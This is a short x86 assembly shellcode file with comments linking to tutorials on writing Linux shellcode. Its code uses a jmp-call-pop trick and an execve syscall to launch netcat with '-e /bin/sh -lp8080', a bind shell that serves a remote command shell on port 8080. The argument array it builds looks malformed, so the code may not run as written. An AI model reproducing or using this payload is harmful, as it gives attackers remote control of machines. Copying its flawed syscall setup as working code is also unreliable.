section .text
global _start
;https://syscall.kernelgrok.com/
;https://idafchev.github.io/exploit/2017/04/14/writing_linux_shellcode.html
;https://pastebin.com/H43pGjLd
;http://morgawr.github.io/hacking/2014/03/29/shellcode-to-reverse-bind-with-netcat
;https://forum.nasm.us/index.php?topic=2069.0
;inicio de /bin/sh 0xf7f3daaa

_start:
    jmp forward

back:
    pop esi
    mov byte[esi+11], 0
    lea ebx, [esi]
    mov byte[esi+21], 0
    lea ecx, [esi+12]
    lea edx, [esi+22]
    push edx

    push ecx
    mov ecx, esp
    mov eax, 0x11    
    int 0x80

forward:
    call back
    db '/bin/netcatN-e/bin/shN-lp8080'
